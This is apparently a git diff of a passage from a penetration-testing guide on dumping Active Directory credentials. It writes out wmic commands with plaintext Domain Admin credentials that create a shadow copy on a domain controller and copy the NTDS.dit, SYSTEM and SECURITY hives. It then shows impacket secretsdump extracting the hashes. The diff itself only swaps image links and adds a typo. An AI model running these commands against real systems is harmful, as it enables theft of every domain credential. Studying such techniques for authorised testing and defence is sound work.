@@ -25,7 +25,7 @@ The attack requires Domain Admin credentials and is a post exploitation attack t
 wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
 ```
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (6).png>)
 
 3\. Now we can copy the NTDS.dit, SYSTEM and SECURITY hives to the `C:\temp` directory.
 
@@ -33,13 +33,13 @@ wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' 
 wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
 ```
 
-![](<../../../.gitbook/assets/image (3).png>)
+![](../../../.gitbook/assets/image.png)
 
 {% hint style="info" %}
 Make sure the C:\temp directory exists on the DC before executing this command!
 {% endhint %}
 
-4\. The next step is to mount the `C:\temp` directory and access the files:
+4\. The next step is to mound the `C:\temp` directory and access the files:
 
 ```
 $creds = Get-Credential
@@ -47,9 +47,9 @@ New-PSDrive -Credential $creds -Name j \\dc02\c$\temp -PSProvider FileSystem
 cd \\dc02\c$\temp
 ```
 
-![](<../../../.gitbook/assets/image (12).png>)
+![](<../../../.gitbook/assets/image (35).png>)
 
-![](<../../../.gitbook/assets/image (9).png>)
+![](<../../../.gitbook/assets/image (5).png>)
 
 5\. Copy the files to your Kali and execute the following command to extract the credentials.
 
@@ -57,9 +57,9 @@ cd \\dc02\c$\temp
 python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
 ```
 
-![](../../../.gitbook/assets/image.png)
+![](<../../../.gitbook/assets/image (1).png>)
 
-![](<../../../.gitbook/assets/image (14).png>)
+![](<../../../.gitbook/assets/image (58).png>)
 
 
 
